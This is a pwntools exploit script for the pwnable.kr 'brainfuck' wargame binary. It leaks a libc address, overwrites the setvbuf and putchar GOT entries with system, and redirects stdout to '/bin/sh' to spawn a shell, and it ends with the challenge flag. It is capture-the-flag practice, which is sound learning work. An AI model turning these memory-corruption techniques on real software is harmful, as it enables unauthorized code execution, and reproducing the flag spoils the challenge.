#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './brainfuck')
libc = ELF(args.LIBC or './libc-2.23.so')

# ----------------- #
# Config / defaults #
# ----------------- #
context.log_level = "info"
REMOTE_USER = "brainfuck"
REMOTE_HOST = "pwnable.kr"
REMOTE_SSH_PORT = 2222
REMOTE_NC_CMD = "nc 0 9001"

### defines ###
STDIN_OFFSET = 0x1b35a0
BINSH = next(libc.search(b'/bin/sh'))
CONST_S_PTR = 0x08048830
CALL_SETVBUF = 0x08048694

### globals ###
payload = '/bin/cat'

def start_llocal(exe_path: str = "./brainfuck", use_gdb: bool = False):
    if use_gdb:
        return gdb.debug([exe_path], gdbscript='tbreak main\ncontinue\n')
    return process([exe_path])

def start_ssh_nc(user: str, host: str, ssh_port: int, nc_cmd: str,
                 keyfile: str = None, password: str = None):
    log.info(f"ssh -> {user}@{host}:{ssh_port} ; running: {nc_cmd}")
    ssh_client = ssh(user, host, port=ssh_port, keyfile=keyfile, password=password)
    io = ssh_client.run(nc_cmd, tty=True)
    io.ssh_client = ssh_client
    return io

def start_local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


### brain-fuck wrappers ###
def pivot_byte():
    global payload
    payload += '<'

def unpivot_byte():
    global payload
    payload += '>'

def input_byte():
    global payload
    payload += ','

def print_byte():
    global payload
    payload += '.'

### helpers ###
def setup_libc_leak():
    # pivot to reach 'STDIN' 
    for i in range(exe.sym.tape - exe.sym.stdin - 3):
        pivot_byte()

    for i in range(4):
        print_byte()
        pivot_byte()

    for i in range(exe.sym.tape - exe.sym.stdin + 1):
        unpivot_byte()

def setup_overwrite_got_setvbufNputchar():
    for i in range(exe.sym.tape - exe.got['setvbuf']):
        pivot_byte()

    # overwrite 'setvbuf' got entry
    for i in range(4):
        input_byte()
        unpivot_byte()

    for i in range(4):
        unpivot_byte()

    # overwrite 'putchar' got entry
    for i in range(4):
        input_byte()
        unpivot_byte()

    for i in range(exe.sym.tape - exe.got['setvbuf'] - 12):
        unpivot_byte()

def setup_stdout_overwrite():
    for i in range(exe.sym.tape - exe.sym.stdout +  1):
        pivot_byte()

    # overwrite 'stdout' FILE struct pointer to point to '/bin/sh'
    for i in range(4):
        input_byte()
        unpivot_byte()

    for i in range(exe.sym.tape - exe.sym.stdout - 5):
        unpivot_byte()

def leak_libc(io: process):
    stdin_addr = u32(io.recv(4), endian='big')
    libc_base = stdin_addr - STDIN_OFFSET
    log.info(f"libc base: {hex(libc_base)}")
    return libc_base

def overwrite_got_setvbufNputchar(io: process):
    io.send(p32(libc.sym.system))
    io.sendline(p32(CALL_SETVBUF))

def stdout_overwrite(io: process):
    io.send(p32(next(libc.search(b'/bin/sh'))))

def main():
    global payload
    exe_path = args.EXE or "./brainfuck"
    use_ssh = args.SSH
    keyfile = args.KEY or None
    password = args.PASSWORD or 'guest'
    use_gdb = args.GDB
    use_local_flag = args.LOCAL

    if use_ssh:
        io = start_ssh_nc(REMOTE_USER, REMOTE_HOST, REMOTE_SSH_PORT, REMOTE_NC_CMD,
                          keyfile=keyfile, password=password)
    else:
        io = start_local()

# -- Exploit goes here --
    ### setup leaks ###
    setup_libc_leak()
    setup_overwrite_got_setvbufNputchar()
    setup_stdout_overwrite()

    # call system('/bin/sh') #
    print_byte()    

    ### payload ###
    io.sendlineafter('[ ]\n', payload)

    ### leaks ###
    libc.address = leak_libc(io)
    overwrite_got_setvbufNputchar(io)
    stdout_overwrite(io)

    io.interactive()

if __name__ == "__main__":
    main()

#flag: bR41n_F4ck_Is_FuN_LanguaG3
